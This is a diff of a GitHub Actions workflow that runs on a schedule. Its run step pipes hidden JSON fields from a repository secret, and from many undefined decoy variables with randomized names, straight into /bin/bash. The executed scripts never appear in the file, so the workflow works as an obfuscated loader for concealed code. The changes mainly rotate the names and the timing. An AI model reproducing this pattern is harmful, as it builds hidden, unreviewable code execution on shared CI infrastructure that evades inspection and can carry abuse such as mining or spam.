@@ -1,10 +1,11 @@
 name: daoxiaoquan1314
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 4/6 * * *'
+    - cron: '36 0/6 * * *'
 
-jobs:  # 14859
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,17 +13,19 @@ jobs:  # 14859
       - uses: actions/checkout@v4
       - name: daoxiaoquan1314
         env:
-          ckdkq27: ${{ secrets.ckdkq27 }}
+          tvvwn2763: ${{ secrets.tvvwn2763 }}
         run: |
-          echo $ckdkq27 | jq -r .ttro6 | /bin/bash
-          echo $s5 | jq -r .xflh208 | /bin/bash
-          echo $ne10 | jq -r .ma09868 | /bin/bash
-          echo $h73 | jq -r .c9 | /bin/bash
-          echo $puzk764 | jq -r .aumoz001 | /bin/bash
-          echo $xsn544 | jq -r .rs4440 | /bin/bash
-          echo $n2 | jq -r .ue6185 | /bin/bash
-          echo $b3 | jq -r .lym4 | /bin/bash
-          echo $nm73182 | jq -r .cd99171 | /bin/bash
-          echo $tchvm123 | jq -r .wgpp327 | /bin/bash
-          echo $mbo55 | jq -r .lmrk0797 | /bin/bash
+          echo $tvvwn2763 | jq -r .re6 | /bin/bash
+          echo $edwmj12099 | jq -r .wpf17561 | /bin/bash
+          echo $f8 | jq -r .zjkr46 | /bin/bash
+          echo $qdrg054 | jq -r .rvekg5 | /bin/bash
+          echo $m03 | jq -r .czfgx926 | /bin/bash
+          echo $pw48 | jq -r .ezg8 | /bin/bash
+          echo $xhrdb8186 | jq -r .uci93345 | /bin/bash
+          echo $tbpa2 | jq -r .czyq27 | /bin/bash
+          echo $n318 | jq -r .s37352 | /bin/bash
+          echo $lqok566 | jq -r .p6 | /bin/bash
+          echo $mcp2877 | jq -r .hzk7449 | /bin/bash
+          echo $cg058 | jq -r .pyp9659 | /bin/bash
+          echo $zinqd9288 | jq -r .yyklh4530 | /bin/bash
 
